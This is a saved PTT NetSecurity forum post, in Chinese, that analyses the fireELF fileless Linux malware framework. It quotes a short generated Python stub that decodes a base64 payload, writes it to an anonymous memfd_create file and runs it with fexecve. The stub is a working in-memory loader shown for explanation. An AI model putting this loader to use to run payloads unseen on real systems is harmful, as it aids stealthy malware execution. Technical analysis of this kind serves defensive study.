@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>[閒聊] 2019-M02 - Fileless Malware Framework - 看板 NetSecurity - 批踢踢實業坊</title>
+<meta name="robots" content="all">
+<meta name="keywords" content="Ptt BBS 批踢踢">
+<meta name="description" content="2019-M02 - Fileless Malware Framework
+看文章的時候看到了一個 [project][0] 介紹 fileless 的惡意程式：他是用 python 寫的 linux-based
+的無檔案惡意程式套件  可以讓使用者簡單快速的產生、建立一個 fileless 惡意程式
+不得不說，這個 project 的 source code 可讀性非常差 (雖然用 Python 撰寫的)
+在 main.py 開始有兩個部分：CLI 參數的處理、以及產生惡意程式的部分
+">
+<meta property="og:site_name" content="Ptt 批踢踢實業坊">
+<meta property="og:title" content="[閒聊] 2019-M02 - Fileless Malware Framework">
+<meta property="og:description" content="2019-M02 - Fileless Malware Framework
+看文章的時候看到了一個 [project][0] 介紹 fileless 的惡意程式：他是用 python 寫的 linux-based
+的無檔案惡意程式套件  可以讓使用者簡單快速的產生、建立一個 fileless 惡意程式
+不得不說，這個 project 的 source code 可讀性非常差 (雖然用 Python 撰寫的)
+在 main.py 開始有兩個部分：CLI 參數的處理、以及產生惡意程式的部分
+">
+<link rel="canonical" href="https://www.ptt.cc/bbs/NetSecurity/M.1555739664.A.090.html">
+
+<link rel="stylesheet" type="text/css" href="bbs-common.css">
+<link rel="stylesheet" type="text/css" href="bbs-base.css" media="screen">
+<link rel="stylesheet" type="text/css" href="bbs-custom.css">
+<link rel="stylesheet" type="text/css" href="pushstream.css" media="screen">
+<link rel="stylesheet" type="text/css" href="bbs-print.css" media="print">
+
+
+
+
+	</head>
+    <body>
+		
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+var js, fjs = d.getElementsByTagName(s)[0];
+if (d.getElementById(id)) return;
+js = d.createElement(s); js.id = id;
+js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<div id="topbar-container">
+	<div id="topbar" class="bbs-content">
+		<a id="logo" href="http://www.ptt.cc/bbs/">批踢踢實業坊</a>
+		<span>&rsaquo;</span>
+		<a class="board" href="http://www.ptt.cc/bbs/NetSecurity/index.html"><span class="board-label">看板 </span>NetSecurity</a>
+		<a class="right small" href="http://www.ptt.cc/about.html">關於我們</a>
+		<a class="right small" href="http://www.ptt.cc/contact.html">聯絡資訊</a>
+	</div>
+</div>
+<div id="navigation-container">
+	<div id="navigation" class="bbs-content">
+		<a class="board" href="http://www.ptt.cc/bbs/NetSecurity/index.html">返回看板</a>
+		<div class="bar"></div>
+		<div class="share">
+			<span>分享</span>
+			<div class="fb-like" data-send="false" data-layout="button_count" data-width="90" data-show-faces="false" data-href="http://www.ptt.cc/bbs/NetSecurity/M.1555739664.A.090.html"></div>
+		</div>
+	</div>
+</div>
+<div id="main-container">
+    <div id="main-content" class="bbs-screen bbs-content"><div class="article-metaline"><span class="article-meta-tag">作者</span><span class="article-meta-value">CMJ0121 (不要偷 Q)</span></div><div class="article-metaline-right"><span class="article-meta-tag">看板</span><span class="article-meta-value">NetSecurity</span></div><div class="article-metaline"><span class="article-meta-tag">標題</span><span class="article-meta-value">[閒聊] 2019-M02 - Fileless Malware Framework</span></div><div class="article-metaline"><span class="article-meta-tag">時間</span><span class="article-meta-value">Sat Apr 20 13:54:21 2019</span></div>
+2019-M02 - Fileless Malware Framework
+
+
+看文章的時候看到了一個 [project][0] 介紹 fileless 的惡意程式：他是用 python 寫的 linux-based
+
+的無檔案惡意程式套件  可以讓使用者簡單快速的產生、建立一個 fileless 惡意程式
+
+
+不得不說，這個 project 的 source code 可讀性非常差 (雖然用 Python 撰寫的)
+
+在 main.py 開始有兩個部分：CLI 參數的處理、以及產生惡意程式的部分
+
+在透過一連串的操作之後最後會產生一個 Python 惡意檔案：
+
+
+        #! /usr/bin/env python
+        import ctypes, os, urllib2, base64
+        libc = ctypes.CDLL(None)
+        argv = ctypes.pointer((ctypes.c_char_p * 0)(*[]))
+        syscall = libc.syscall
+        fexecve = libc.fexecve
+        content = base64.b64decode(&#34;...&#34;)
+        fd = syscall(319, &#34;&#34;, 1)
+        os.write(fd, content)
+        fexecve(fd, argv, argv)
+
+
+從產生的程式碼來看他的目的是透過：ctypes 來找到 [fexecve][1] 跟 [sys_memfd_create][2]
+
+這兩個 syscall 來完成無檔案的惡意程式
+
+先透過 **memfd_create** 來產生一個暱名檔案 (anonymous file)、寫入惡意內容、最後透過 **fexecve** 執行。
+
+
+[0]: <a href="https://github.com/rek7/fireELF/" target="_blank" rel="nofollow">https://github.com/rek7/fireELF/</a>
+[1]: <a href="https://linux.die.net/man/3/fexecve" target="_blank" rel="nofollow">https://linux.die.net/man/3/fexecve</a>
+[2]: <a href="https://www.systutorials.com/docs/linux/man/2-memfd_create/" target="_blank" rel="nofollow">https://www.systutorials.com/docs/linux/man/2-memfd_create/</a>
+
+--
+<span class="f2">※ 發信站: 批踢踢實業坊(ptt.cc), 來自: 106.1.224.240
+</span><span class="f2">※ 文章網址: <a href="https://www.ptt.cc/bbs/NetSecurity/M.1555739664.A.090.html" target="_blank" rel="nofollow">https://www.ptt.cc/bbs/NetSecurity/M.1555739664.A.090.html</a>
+</span></div>
+    
+    <div id="article-polling" data-pollurl="http://www.ptt.cc/poll/NetSecurity/M.1555739664.A.090.html?cacheKey=2100-487100976&amp;offset=1411&amp;offset-sig=967d8c546d6f6bc7df822628880131400074ac08" data-longpollurl="/v1/longpoll?id=b9ea4475cabc15c30254774abf4b097f1e63a00d" data-offset="1411"></div>
+    
+
+    
+</div>
+
+		
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-32365737-1', {
+    cookieDomain: 'ptt.cc',
+    legacyCookieDomain: 'ptt.cc'
+  });
+  ga('send', 'pageview');
+</script>
+
+
+		
+<script src="jquery.min.js"></script>
+<script src="script>
+
+    </body>
+</html>
